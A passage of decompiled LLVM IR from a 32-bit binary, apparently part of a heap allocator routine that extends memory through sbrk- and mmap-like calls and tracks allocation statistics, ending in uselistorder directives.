dec_label_pc_805105c:                             ; preds = %dec_label_pc_8051035, %dec_label_pc_805105a
  %v0_8051060 = phi i32 [ %v2_805104b, %dec_label_pc_8051035 ], [ %v2_805105a, %dec_label_pc_805105a ]
  %v5_8051060 = add i32 %v0_8051060, %v1_8050f68
  store i32 %v5_8051060, i32* %eax.global-to-local, align 4
  %v1_8051064 = sub i32 0, %v0_8050f34
  store i32 %v1_8051064, i32* @edx, align 4
  %v2_805106c = and i32 %v5_8051060, %v1_8051064
  store i32 %v2_805106c, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_805106c, 1
  br i1 %tmp91, label %dec_label_pc_8051086, label %dec_label_pc_8051070

dec_label_pc_8051070:                             ; preds = %dec_label_pc_805105c
  store i32 %v2_805106c, i32* %stack_var_-92, align 4
  %v1_8051074 = call i32 @function_8052891(i32 %v2_805106c)
  store i32 %v1_8051074, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_8051074, i32* @ebx, align 4
  %v10_8051081 = icmp eq i32 %v1_8051074, -1
  %v1_8051084 = icmp eq i1 %v10_8051081, false
  br i1 %v1_8051084, label %dec_label_pc_80510dc.dec_label_pc_80510e5_crit_edge, label %dec_label_pc_8051070.dec_label_pc_8051086_crit_edge

dec_label_pc_8051070.dec_label_pc_8051086_crit_edge: ; preds = %dec_label_pc_8051070
  %v0_8051086.pre = load i8, i8* @global_var_8054920.49, align 32
  br label %dec_label_pc_8051086

dec_label_pc_8051086:                             ; preds = %dec_label_pc_8051070.dec_label_pc_8051086_crit_edge, %dec_label_pc_805105c
  %v0_80510b2 = phi i32 [ -1, %dec_label_pc_8051070.dec_label_pc_8051086_crit_edge ], [ %v1_8051064, %dec_label_pc_805105c ]
  %v0_8051086 = phi i8 [ %v0_8051086.pre, %dec_label_pc_8051070.dec_label_pc_8051086_crit_edge ], [ %v0_8051051, %dec_label_pc_805105c ]
  %v1_8051086 = urem i8 %v0_8051086, 2
  %v2_8051086 = icmp eq i8 %v1_8051086, 0
  br i1 %v2_8051086, label %dec_label_pc_8051086.dec_label_pc_805109b_crit_edge, label %dec_label_pc_805108f

dec_label_pc_8051086.dec_label_pc_805109b_crit_edge: ; preds = %dec_label_pc_8051086
  %v0_805109b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805109b

dec_label_pc_805108f:                             ; preds = %dec_label_pc_8051086
  %v2_8051093 = add i32 %v1_8051048, %v1_8050f68
  store i32 %v2_8051093, i32* %eax.global-to-local, align 4
  %v0_8051095 = load i32, i32* @esi, align 4
  %v2_8051095 = add i32 %v0_8051095, %v2_8051093
  %v5_8051097 = and i32 %v2_8051095, %v1_8051064
  store i32 %v5_8051097, i32* @esi, align 4
  br label %dec_label_pc_805109b

dec_label_pc_805109b:                             ; preds = %dec_label_pc_8051086.dec_label_pc_805109b_crit_edge, %dec_label_pc_805108f
  %v0_805109b = phi i32 [ %v0_805109b.pre, %dec_label_pc_8051086.dec_label_pc_805109b_crit_edge ], [ %v5_8051097, %dec_label_pc_805108f ]
  %tmp130 = icmp ult i32 %v0_805109b, 1048576
  br i1 %tmp130, label %dec_label_pc_80510a3, label %dec_label_pc_80510a8

dec_label_pc_80510a3:                             ; preds = %dec_label_pc_805109b
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_80510a8

dec_label_pc_80510a8:                             ; preds = %dec_label_pc_805109b, %dec_label_pc_80510a3
  %v0_80510bc = phi i32 [ %v0_805109b, %dec_label_pc_805109b ], [ 1048576, %dec_label_pc_80510a3 ]
  %tmp131 = icmp ugt i32 %v0_80510bc, %.v1_8050bf3
  br i1 %tmp131, label %dec_label_pc_80510b2, label %dec_label_pc_80512ea

dec_label_pc_80510b2:                             ; preds = %dec_label_pc_80510a8
  store i32 0, i32* %stack_var_-92, align 4
  %v8_80510bf = call i32 @function_80523e0(i32 0, i32 %v0_80510bc, i32 3, i32 34, i32 0, i32 0, i32 %v0_80510b2, i32 %v0_80510b2)
  store i32 %v8_80510bf, i32* %eax.global-to-local, align 4
  store i32 %v8_80510bf, i32* @ebx, align 4
  %v10_80510c9 = icmp eq i32 %v8_80510bf, -1
  br i1 %v10_80510c9, label %dec_label_pc_80512ea, label %dec_label_pc_80510dc.thread

dec_label_pc_80510dc.thread:                      ; preds = %dec_label_pc_80510b2
  %v0_80510d2 = load i8, i8* @global_var_8054920.49, align 1
  %v2_80510d2 = and i8 %v0_80510d2, -2
  store i8 %v2_80510d2, i8* @global_var_8054920.49, align 32
  %v1_80510d9 = load i32, i32* @esi, align 4
  %v2_80510d9 = add i32 %v1_80510d9, %v8_80510bf
  store i32 %v2_80510d9, i32* @edx, align 4
  br label %dec_label_pc_80510e5

dec_label_pc_80510dc.dec_label_pc_80510e5_crit_edge: ; preds = %dec_label_pc_8051070
  %v1_80510e9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80510e5

dec_label_pc_80510e5:                             ; preds = %dec_label_pc_80510dc.dec_label_pc_80510e5_crit_edge, %dec_label_pc_80510dc.thread
  %v1_80510e9 = phi i32 [ %v1_80510d9, %dec_label_pc_80510dc.thread ], [ %v1_80510e9.pre, %dec_label_pc_80510dc.dec_label_pc_80510e5_crit_edge ]
  %v0_80511b1100 = phi i32 [ %v8_80510bf, %dec_label_pc_80510dc.thread ], [ %v1_8051074, %dec_label_pc_80510dc.dec_label_pc_80510e5_crit_edge ]
  %v0_80511a399 = phi i32 [ %v2_80510d9, %dec_label_pc_80510dc.thread ], [ -1, %dec_label_pc_80510dc.dec_label_pc_80510e5_crit_edge ]
  %v0_80510e9 = load i32, i32* @global_var_8054928.46, align 8
  %v2_80510e9 = add i32 %v1_80510e9, %v0_80510e9
  store i32 %v2_80510e9, i32* @global_var_8054928.46, align 8
  %v2_80510ef = add i32 %v1_8051048, %v0_8051035
  store i32 %v2_80510ef, i32* %ecx.global-to-local, align 4
  %v2_80510f1 = sub i32 %v0_80511b1100, %v2_80510ef
  %v12_80510f1 = icmp eq i32 %v2_80510f1, 0
  %v10_80510f5 = icmp eq i32 %v0_80511a399, -1
  %tmp132 = and i1 %v12_80510f1, %v10_80510f5
  br i1 %tmp132, label %dec_label_pc_80510fa, label %dec_label_pc_805110c

dec_label_pc_80510fa:                             ; preds = %dec_label_pc_80510e5
  %v2_80510fa = add i32 %v1_80510e9, %v1_8051048
  store i32 %v0_8051035, i32* %ecx.global-to-local, align 4
  %v1_8051101 = or i32 %v2_80510fa, 1
  store i32 %v1_8051101, i32* %eax.global-to-local, align 4
  store i32 %v1_8051101, i32* %v2_805103e, align 4
  br label %dec_label_pc_8051239

dec_label_pc_805110c:                             ; preds = %dec_label_pc_80510e5
  %v7_80510f1 = icmp ult i32 %v0_80511b1100, %v2_80510ef
  %v0_805110c = load i8, i8* @global_var_8054920.49, align 1
  %v1_805110c = sext i8 %v0_805110c to i32
  store i32 %v1_805110c, i32* %eax.global-to-local, align 4
  %v2_8051111 = urem i8 %v0_805110c, 2
  %v3_8051111 = icmp eq i8 %v2_8051111, 0
  %brmerge = or i1 %v2_8051048, %v3_8051111
  %v1_805111b = icmp eq i1 %v7_80510f1, false
  %or.cond97 = or i1 %v1_805111b, %brmerge
  br i1 %or.cond97, label %dec_label_pc_8051125, label %dec_label_pc_805111d

dec_label_pc_805111d:                             ; preds = %dec_label_pc_805110c
  %v1_805111d = and i32 %v1_805110c, -2
  %v4_805111d = trunc i32 %v1_805111d to i8
  store i32 %v1_805111d, i32* %eax.global-to-local, align 4
  store i8 %v4_805111d, i8* @global_var_8054920.49, align 32
  br label %dec_label_pc_8051125

dec_label_pc_8051125:                             ; preds = %dec_label_pc_805110c, %dec_label_pc_805111d
  %v0_8051125 = phi i8 [ %v0_805110c, %dec_label_pc_805110c ], [ %v4_805111d, %dec_label_pc_805111d ]
  %v1_8051125 = urem i8 %v0_8051125, 2
  %v2_8051125 = icmp eq i8 %v1_8051125, 0
  br i1 %v2_8051125, label %dec_label_pc_80511a3, label %dec_label_pc_805112e

dec_label_pc_805112e:                             ; preds = %dec_label_pc_8051125
  br i1 %v2_8051048, label %dec_label_pc_805113c, label %dec_label_pc_8051132

dec_label_pc_8051132:                             ; preds = %dec_label_pc_805112e
  store i32 %v2_80510f1, i32* %eax.global-to-local, align 4
  %v2_8051136 = add i32 %v2_80510e9, %v2_80510f1
  store i32 %v2_8051136, i32* @global_var_8054928.46, align 8
  br label %dec_label_pc_805113c

dec_label_pc_805113c:                             ; preds = %dec_label_pc_805112e, %dec_label_pc_8051132
  %v1_805113e = urem i32 %v0_80511b1100, 8
  %v2_805113e = icmp eq i32 %v1_805113e, 0
  store i32 %v1_805113e, i32* %edx.global-to-local, align 4
  %v1_8051141 = icmp eq i1 %v2_805113e, false
  br i1 %v1_8051141, label %dec_label_pc_8051149, label %dec_label_pc_8051143

dec_label_pc_8051143:                             ; preds = %dec_label_pc_805113c
  store i32 %v0_80511b1100, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051153

dec_label_pc_8051149:                             ; preds = %dec_label_pc_805113c
  %v2_805114e = sub nsw i32 8, %v1_805113e
  store i32 %v2_805114e, i32* %eax.global-to-local, align 4
  %v2_8051150 = add i32 %v2_805114e, %v0_80511b1100
  store i32 %v2_8051150, i32* @edi, align 4
  br label %dec_label_pc_8051153

dec_label_pc_8051153:                             ; preds = %dec_label_pc_8051143, %dec_label_pc_8051149
  %v0_8051156 = phi i32 [ 0, %dec_label_pc_8051143 ], [ %v2_805114e, %dec_label_pc_8051149 ]
  %v2_8051153 = add i32 %v1_80510e9, %v0_80511b1100
  %v2_8051156 = add i32 %v0_8051156, %v1_8051048
  store i32 %v2_8051156, i32* %ecx.global-to-local, align 4
  %v2_805115f = add i32 %v2_8051156, %v2_8051153
  store i32 %v2_805115f, i32* %edx.global-to-local, align 4
  %v2_8051165 = add i32 %v2_805115f, %v1_8050f68
  %v5_8051168 = and i32 %v2_8051165, %v1_8051064
  %v2_805116f = sub i32 %v5_8051168, %v2_805115f
  store i32 %v2_805116f, i32* %eax.global-to-local, align 4
  %v2_8051171 = add i32 %v2_805116f, %v2_8051156
  store i32 %v2_8051171, i32* @esi, align 4
  store i32 %v2_8051171, i32* %stack_var_-92, align 4
  %v1_8051175 = call i32 @function_8052891(i32 %v2_8051171)
  store i32 %v1_8051175, i32* %eax.global-to-local, align 4
  store i32 %v1_8051175, i32* @edx, align 4
  %v10_805117f = icmp eq i32 %v1_8051175, -1
  %v1_8051182 = icmp eq i1 %v10_805117f, false
  br i1 %v1_8051182, label %dec_label_pc_8051192, label %dec_label_pc_8051184

dec_label_pc_8051184:                             ; preds = %dec_label_pc_8051153
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8051189 = call i32 @function_8052891(i32 0)
  store i32 %v1_8051189, i32* %eax.global-to-local, align 4
  store i32 %v1_8051189, i32* @edx, align 4
  br label %dec_label_pc_80511c6

dec_label_pc_8051192:                             ; preds = %dec_label_pc_8051153
  %v1_8051192 = load i32, i32* @ebx, align 4
  %v7_8051192 = icmp ult i32 %v1_8051175, %v1_8051192
  %v1_8051194 = icmp eq i1 %v7_8051192, false
  br i1 %v1_8051194, label %dec_label_pc_80511cb, label %dec_label_pc_8051196

dec_label_pc_8051196:                             ; preds = %dec_label_pc_8051192
  %v0_8051196 = load i8, i8* @global_var_8054920.49, align 1
  %v2_8051196 = and i8 %v0_8051196, -2
  store i8 %v2_8051196, i8* @global_var_8054920.49, align 32
  store i32 %v2_8051153, i32* @edx, align 4
  br label %dec_label_pc_80511aa

dec_label_pc_80511a3:                             ; preds = %dec_label_pc_8051125
  store i32 %v0_80511b1100, i32* @edi, align 4
  br i1 %v10_80510f5, label %dec_label_pc_80511ae, label %dec_label_pc_80511aa

dec_label_pc_80511aa:                             ; preds = %dec_label_pc_80511a3, %dec_label_pc_8051196
  %v0_80511cb58 = phi i32 [ %v2_8051153, %dec_label_pc_8051196 ], [ %v0_80511a399, %dec_label_pc_80511a3 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80511cb

dec_label_pc_80511ae:                             ; preds = %dec_label_pc_80511a3
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80511b5 = call i32 @function_8052891(i32 0)
  store i32 %v1_80511b5, i32* @edx, align 4
  %v1_80511bc = load i32, i32* @ebx, align 4
  %v2_80511bc = sub i32 %v1_80511b5, %v1_80511bc
  %v1_80511be = load i32, i32* @esi, align 4
  %v2_80511be = sub i32 %v2_80511bc, %v1_80511be
  store i32 %v2_80511be, i32* %eax.global-to-local, align 4
  %v0_80511c0 = load i32, i32* @global_var_8054928.46, align 8
  %v2_80511c0 = add i32 %v0_80511c0, %v2_80511be
  store i32 %v2_80511c0, i32* @global_var_8054928.46, align 8
  br label %dec_label_pc_80511c6

dec_label_pc_80511c6:                             ; preds = %dec_label_pc_8051184, %dec_label_pc_80511ae
  %v0_80511cb57 = phi i32 [ %v1_8051189, %dec_label_pc_8051184 ], [ %v1_80511b5, %dec_label_pc_80511ae ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80511cb

dec_label_pc_80511cb:                             ; preds = %dec_label_pc_8051192, %dec_label_pc_80511aa, %dec_label_pc_80511c6
  %v0_80511d0 = phi i32 [ %v1_8051175, %dec_label_pc_8051192 ], [ %v0_80511cb58, %dec_label_pc_80511aa ], [ %v0_80511cb57, %dec_label_pc_80511c6 ]
  %v10_80511cb = icmp eq i32 %v0_80511d0, -1
  br i1 %v10_80511cb, label %dec_label_pc_8051239, label %dec_label_pc_80511d0

dec_label_pc_80511d0:                             ; preds = %dec_label_pc_80511cb
  %v1_80511d0 = load i32, i32* @edi, align 4
  %v2_80511d0 = sub i32 %v0_80511d0, %v1_80511d0
  store i32 %v2_80511d0, i32* @edx, align 4
  store i32 %v1_80511d0, i32* @global_var_80545ec.34, align 4
  %v1_80511d8 = load i32, i32* @esi, align 4
  %v2_80511d8 = add i32 %v1_80511d8, %v2_80511d0
  %v1_80511db = or i32 %v2_80511d8, 1
  store i32 %v1_80511db, i32* %eax.global-to-local, align 4
  %v2_80511de = add i32 %v1_80511d0, 4
  %v3_80511de = inttoptr i32 %v2_80511de to i32*
  store i32 %v1_80511db, i32* %v3_80511de, align 4
  %v0_80511e1 = load i32, i32* @global_var_8054928.46, align 8
  %v1_80511e1 = load i32, i32* @esi, align 4
  %v2_80511e1 = add i32 %v1_80511e1, %v0_80511e1
  store i32 %v2_80511e1, i32* @global_var_8054928.46, align 8
  br i1 %v2_8051048, label %dec_label_pc_8051239, label %dec_label_pc_80511eb

dec_label_pc_80511eb:                             ; preds = %dec_label_pc_80511d0
  %v1_80511eb = add i32 %v1_8051048, -12
  store i32 %v0_8051035, i32* %ecx.global-to-local, align 4
  %v1_80511f2 = and i32 %v1_80511eb, -8
  store i32 %v1_80511f2, i32* %eax.global-to-local, align 4
  %v1_80511f7 = or i32 %v1_80511f2, 1
  store i32 %v1_80511f7, i32* @edx, align 4
  %v5_80511fa = icmp ult i32 %v1_80511f2, 15
  store i32 %v1_80511f7, i32* %v2_805103e, align 4
  %v0_8051200 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051200 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051200 = add i32 %v0_8051200, 4
  %v3_8051200 = add i32 %v2_8051200, %v1_8051200
  %v4_8051200 = inttoptr i32 %v3_8051200 to i32*
  store i32 5, i32* %v4_8051200, align 4
  %v0_8051208 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051208 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051208 = add i32 %v0_8051208, 8
  %v3_8051208 = add i32 %v2_8051208, %v1_8051208
  %v4_8051208 = inttoptr i32 %v3_8051208 to i32*
  store i32 5, i32* %v4_8051208, align 4
  br i1 %v5_80511fa, label %dec_label_pc_8051239, label %dec_label_pc_8051212

dec_label_pc_8051212:                             ; preds = %dec_label_pc_80511eb
  %v0_8051215 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051217 = add i32 %v0_8051215, 8
  store i32 %v1_8051217, i32* %eax.global-to-local, align 4
  %v0_805121a = load i32, i32* @global_var_8054904.50, align 4
  store i32 %v0_805121a, i32* @ebx, align 4
  store i32 %v1_8051217, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8054904.50, align 4
  %v1_805122b = call i32 @function_8051963(i32 %v1_8051217)
  store i32 %v1_805122b, i32* %eax.global-to-local, align 4
  %v0_8051230 = load i32, i32* @ebx, align 4
  store i32 %v0_8051230, i32* @global_var_8054904.50, align 4
  br label %dec_label_pc_8051239

dec_label_pc_8051239:                             ; preds = %dec_label_pc_80511eb, %dec_label_pc_80511d0, %dec_label_pc_80511cb, %dec_label_pc_80510fa, %dec_label_pc_8051212
  %v0_8051239 = load i32, i32* @global_var_8054928.46, align 8
  store i32 %v0_8051239, i32* %eax.global-to-local, align 4
  %v1_805123e = load i32, i32* @global_var_805492c.51, align 4
  %tmp133 = icmp ugt i32 %v0_8051239, %v1_805123e
  br i1 %tmp133, label %dec_label_pc_8051246, label %dec_label_pc_805124b

dec_label_pc_8051246:                             ; preds = %dec_label_pc_8051239
  store i32 %v0_8051239, i32* @global_var_805492c.51, align 4
  br label %dec_label_pc_805124b

dec_label_pc_805124b:                             ; preds = %dec_label_pc_8051239, %dec_label_pc_8051246
  %v1_805124b = load i32, i32* @global_var_8054924.44, align 4
  %v2_805124b = add i32 %v1_805124b, %v0_8051239
  store i32 %v2_805124b, i32* %eax.global-to-local, align 4
  %v1_8051251 = load i32, i32* @global_var_8054934.47, align 4
  %tmp134 = icmp ugt i32 %v2_805124b, %v1_8051251
  br i1 %tmp134, label %dec_label_pc_8051259, label %dec_label_pc_805125e

dec_label_pc_8051259:                             ; preds = %dec_label_pc_805124b
  store i32 %v2_805124b, i32* @global_var_8054934.47, align 4
  br label %dec_label_pc_805125e

dec_label_pc_805125e:                             ; preds = %dec_label_pc_805124b, %dec_label_pc_8051259
  %v0_805125e = load i32, i32* @global_var_80545ec.34, align 4
  store i32 %v0_805125e, i32* @ebx, align 4
  %v1_8051264 = add i32 %v0_805125e, 4
  %v2_8051264 = inttoptr i32 %v1_8051264 to i32*
  %v3_8051264 = load i32, i32* %v2_8051264, align 4
  %v1_8051267 = and i32 %v3_8051264, -4
  store i32 %v1_8051267, i32* %ecx.global-to-local, align 4
  %v10_805126a = icmp ult i32 %v1_8051267, %v1_8050f07
  br i1 %v10_805126a, label %dec_label_pc_80512ea, label %dec_label_pc_8051270

dec_label_pc_8051270:                             ; preds = %dec_label_pc_805125e
  store i32 %.v1_8050bf3, i32* %esi.global-to-local, align 4
  %v2_8051276 = sub i32 %v1_8051267, %.v1_8050bf3
  store i32 %v2_8051276, i32* %ecx.global-to-local, align 4
  %v2_8051278 = add i32 %v0_805125e, %.v1_8050bf3
  store i32 %v2_8051278, i32* @edx, align 4
  %v1_805127b = or i32 %.v1_8050bf3, 1
  store i32 %v1_805127b, i32* %eax.global-to-local, align 4
  store i32 %v2_8051278, i32* @global_var_80545ec.34, align 4
  store i32 %v1_805127b, i32* %v2_8051264, align 4
  %v0_8051287.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051287

dec_label_pc_8051287:                             ; preds = %dec_label_pc_8050f18, %dec_label_pc_8051270
  %v0_8051287 = phi i32 [ %v5_8050f2b, %dec_label_pc_8050f18 ], [ %v0_8051287.pre, %dec_label_pc_8051270 ]
  %v1_8051287 = or i32 %v0_8051287, 1
  store i32 %v1_8051287, i32* %ecx.global-to-local, align 4
  %v0_805128a = load i32, i32* @ebx, align 4
  %v1_805128a = add i32 %v0_805128a, 8
  store i32 %v1_805128a, i32* %ebx.global-to-local, align 4
  %v1_805128d = load i32, i32* @edx, align 4
  %v2_805128d = add i32 %v1_805128d, 4
  %v3_805128d = inttoptr i32 %v2_805128d to i32*
  store i32 %v1_8051287, i32* %v3_805128d, align 4
  br label %dec_label_pc_80512f7

dec_label_pc_8051292:                             ; preds = %dec_label_pc_8050cd2
  %v5_8051298 = sub i32 %v1_8050cb5, %.v1_8050bf3
  store i32 %v5_8051298, i32* %eax.global-to-local, align 4
  %v2_805129c = add i32 %v1_80512a9, %.v1_8050bf3
  store i32 %v2_805129c, i32* @edx, align 4
  %v1_80512a0 = or i32 %.v1_8050bf3, 1
  store i32 %v2_805129c, i32* @global_var_80545f0.35, align 16
  store i32 %v1_80512a0, i32* %v2_8050caf, align 4
  %v0_80512ac = load i32, i32* %eax.global-to-local, align 4
  %v0_80512ae = load i32, i32* @edx, align 4
  store i32 %v0_80512ae, i32* @global_var_80545fc.52, align 4
  %v1_80512b4 = or i32 %v0_80512ac, 1
  store i32 %v1_80512b4, i32* %ecx.global-to-local, align 4
  store i32 %v0_80512ae, i32* @global_var_8054600.37, align 512
  %v1_80512bd = add i32 %v0_80512ae, 8
  %v2_80512bd = inttoptr i32 %v1_80512bd to i32*
  store i32 ptrtoint (i32* @global_var_80545f4.36 to i32), i32* %v2_80512bd, align 4
  %v0_80512c4 = load i32, i32* @edx, align 4
  %v1_80512c4 = add i32 %v0_80512c4, 12
  %v2_80512c4 = inttoptr i32 %v1_80512c4 to i32*
  store i32 ptrtoint (i32* @global_var_80545f4.36 to i32), i32* %v2_80512c4, align 4
  %v0_80512cb = load i32, i32* %ecx.global-to-local, align 4
  %v1_80512cb = load i32, i32* @edx, align 4
  %v2_80512cb = add i32 %v1_80512cb, 4
  %v3_80512cb = inttoptr i32 %v2_80512cb to i32*
  store i32 %v0_80512cb, i32* %v3_80512cb, align 4
  %v0_80512ce = load i32, i32* %eax.global-to-local, align 4
  %v1_80512ce = load i32, i32* @edx, align 4
  %v3_80512ce = add i32 %v1_80512ce, %v0_80512ce
  %v4_80512ce = inttoptr i32 %v3_80512ce to i32*
  store i32 %v0_80512ce, i32* %v4_80512ce, align 4
  br label %dec_label_pc_80512dc

dec_label_pc_80512d3:                             ; preds = %dec_label_pc_8050ce1
  store i32 %.v1_8050bf3, i32* %ebx.global-to-local, align 4
  %v0_80512d7 = load i32, i32* @ebp, align 4
  %v2_80512d7 = or i32 %.v1_8050bf3, 4
  %v3_80512d7 = add i32 %v0_80512d7, %v2_80512d7
  %v4_80512d7 = inttoptr i32 %v3_80512d7 to i32*
  %v5_80512d7 = load i32, i32* %v4_80512d7, align 4
  %v6_80512d7 = or i32 %v5_80512d7, 1
  store i32 %v6_80512d7, i32* %v4_80512d7, align 4
  br label %dec_label_pc_80512dc

dec_label_pc_80512dc:                             ; preds = %dec_label_pc_8051292, %dec_label_pc_80512d3
  %v0_80512dc = load i32, i32* @ebp, align 4
  %v1_80512dc = add i32 %v0_80512dc, 8
  store i32 %v1_80512dc, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80512f7

dec_label_pc_80512e1:                             ; preds = %dec_label_pc_8050dd1
  %v1_80512e1 = load i32, i32* @ebx, align 4
  %v2_80512e1 = add i32 %v0_8050de0, 4
  %v3_80512e1 = add i32 %v2_80512e1, %v1_80512e1
  %v4_80512e1 = inttoptr i32 %v3_80512e1 to i32*
  %v5_80512e1 = load i32, i32* %v4_80512e1, align 4
  %v6_80512e1 = or i32 %v5_80512e1, 1
  store i32 %v6_80512e1, i32* %v4_80512e1, align 4
  br label %dec_label_pc_80512e6

dec_label_pc_80512e6:                             ; preds = %dec_label_pc_8050de9, %dec_label_pc_80512e1
  %v0_80512e6 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80512e6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80512f7

dec_label_pc_80512ea:                             ; preds = %dec_label_pc_80510a8, %dec_label_pc_805125e, %dec_label_pc_80510b2
  %v0_80512ea = load i32, i32* %stack_var_-92, align 4
  %v1_80512ea = call i32 @function_805076b(i32 %v0_80512ea)
  store i32 %v1_80512ea, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80512f1 = inttoptr i32 %v1_80512ea to i32*
  store i32 12, i32* %v1_80512f1, align 4
  br label %dec_label_pc_80512f7

dec_label_pc_80512f7:                             ; preds = %dec_label_pc_80512e6, %dec_label_pc_80512dc, %dec_label_pc_8051287, %dec_label_pc_8050f43, %dec_label_pc_8050ef5, %dec_label_pc_8050c7c, %dec_label_pc_80512ea
  store i32 %v2_8050bb3, i32* @eax, align 4
  store i32 %v2_8050bb3, i32* %stack_var_-92, align 4
  %v2_8051300 = call i32 @function_80520ca(i32 %v2_8050bb3, i32 1)
  store i32 %v2_8051300, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051308

dec_label_pc_8051308:                             ; preds = %dec_label_pc_8050bd1, %dec_label_pc_80512f7
  %v0_805130b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805130b, i32* %eax.global-to-local, align 4
  %v2_805130d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805130d, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050ba0, i32* @esi, align 4
  store i32 %v0_8050b9f, i32* @edi, align 4
  store i32 %v0_8050b9e, i32* @ebp, align 4
  ret i32 %v0_805130b

; uselistorder directives
  uselistorder i32 %v0_80512ce, { 1, 0 }
  uselistorder i32 %v0_80512ae, { 1, 0, 2 }
  uselistorder i32 %v2_805124b, { 1, 0, 2 }
  uselistorder i32 %v0_8051239, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80511d0, { 1, 0 }
  uselistorder i32 %v2_80511be, { 1, 0 }
  uselistorder i32 %v1_8051175, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_805115f, { 1, 0, 2 }
  uselistorder i32 %v2_8051153, { 1, 2, 0 }
  uselistorder i32 %v2_805114e, { 1, 0, 2 }
  uselistorder i32 %v1_805113e, { 2, 1, 0 }
  uselistorder i8 %v0_805110c, { 1, 0, 2 }
  uselistorder i1 %v10_80510f5, { 1, 0 }
  uselistorder i32 %v2_80510ef, { 1, 0, 2 }
  uselistorder i32 %v0_80511b1100, { 3, 1, 2, 4, 0, 6, 5 }
  uselistorder i32 %v1_80510e9, { 2, 1, 0 }
  uselistorder i32 %v8_80510bf, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_80510bc, { 1, 0 }
  uselistorder i32 %v0_805109b, { 1, 0 }
  uselistorder i32 %v2_805106c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8051064, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8051051, { 1, 0 }
  uselistorder i1 %v2_8051048, { 2, 1, 0 }
  uselistorder i32 %v1_8051048, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_8051035, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8051019, { 1, 0, 2 }
  uselistorder i32 %v2_8051005, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8050fce, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050fc2, { 2, 1, 0 }
  uselistorder i32 %v8_8050fb1, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8050f98, { 1, 0, 2 }
  uselistorder i32 %v0_8050f34, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8050f07, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8050efd, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8050eef, { 1, 0 }
  uselistorder i32 %v1_8050e86, { 1, 0 }
  uselistorder i32 %v3_8050e7a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8050e8a, { 1, 0 }
  uselistorder i32 %v2_8050e74, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_8050e717, { 1, 0 }
  uselistorder i32 %v2_8050e66, { 1, 0 }
  uselistorder i32 %v1_8050e4a, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8050e46, { 2, 1, 0 }
  uselistorder i32 %v1_8050e42, { 1, 0 }
  uselistorder i32 %v1_8050e36, { 2, 1, 0 }
  uselistorder i32 %v2_8050e2c, { 1, 0 }
  uselistorder i32 %v1_8050e29, { 1, 2, 0 }
  uselistorder i32 %v4_8050dc7, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_8050e12, { 1, 0 }
  uselistorder i32 %v0_8050de0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8050db3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8050d80, { 0, 2, 1 }
  uselistorder i32 %v2_8050d64, { 1, 0 }
  uselistorder i32 %v1_8050d5a, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8050d55.lcssa, { 1, 0 }
  uselistorder i32 %v3_8050d45, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8050d3c, { 1, 0, 2 }
  uselistorder i32 %v2_8050d18, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8050d00, { 2, 1, 0 }
  uselistorder i32 %v0_8050cec, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8050cb2, { 1, 0, 2 }
  uselistorder i32 %v1_80512a9, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050d809, { 1, 0, 2 }
  uselistorder i32 %v3_8050c5f, { 1, 0, 2 }
  uselistorder i32 %v2_8050c51, { 2, 1, 0 }
  uselistorder i1 %v6_8050c4b, { 1, 0, 2 }
  uselistorder i32 %v2_8050c2c, { 2, 1, 0 }
  uselistorder i8 %v0_8050bfa, { 3, 1, 2, 0, 4 }
  uselistorder i32 %.v1_8050bf3, { 30, 12, 31, 2, 14, 32, 3, 21, 22, 33, 34, 4, 19, 20, 23, 25, 24, 5, 18, 17, 6, 16, 15, 28, 7, 27, 26, 35, 13, 29, 0, 11, 9, 10, 1, 8 }
